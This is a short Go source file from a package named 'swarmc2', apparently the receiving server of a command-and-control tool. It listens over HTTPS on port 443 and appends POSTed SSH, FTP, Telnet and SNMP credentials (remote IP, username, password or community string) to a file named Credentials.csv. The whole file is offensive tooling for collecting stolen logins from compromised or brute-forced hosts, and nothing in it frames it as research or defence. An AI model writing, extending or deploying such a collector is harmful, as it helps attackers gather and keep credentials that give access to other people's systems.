package swarmc2

import (
	"net/http"
	"encoding/csv"
	"os"
	"fmt"
)

func csvFileCreate(fileName string, data []string) {
	outFile, err := os.OpenFile(fileName, os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0644)
	if err != nil {
		panic(err)
	}
	defer outFile.Close()
	writer := csv.NewWriter(outFile)
	writer.Write(data)
	defer writer.Flush()
}

func SetupHandler() error {
	http.HandleFunc("/", handleConnection)
	err := http.ListenAndServeTLS(":443", "server.crt", "server.key", nil)
	if err != nil {
		return err
	}
	return nil
}

func handleConnection(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case "GET":
		return
	case "POST":
		err := r.ParseForm()
		if err != nil {
			fmt.Println(err)
		}
		conType := r.FormValue("connection")
		switch conType {
		case "SMB":
			fmt.Println("SMB")
		case "SSH":
			data := []string{conType, r.FormValue("remote_ip"), r.FormValue("user"), r.FormValue("pass")}
			csvFileCreate("Credentials.csv", data)

		case "FTP":
			data := []string{conType, r.FormValue("remote_ip"), r.FormValue("user"), r.FormValue("pass")}
			csvFileCreate("Credentials.csv", data)

		case "SNMP":
			data := []string{conType, r.FormValue("remote_ip"), r.FormValue("com_string")}
			csvFileCreate("Credentials.csv", data)

		case "TELNET":
			data := []string{conType, r.FormValue("remote_ip"), r.FormValue("user"), r.FormValue("pass")}
			csvFileCreate("Credentials.csv", data)

		default:
			return
		}
	}
}

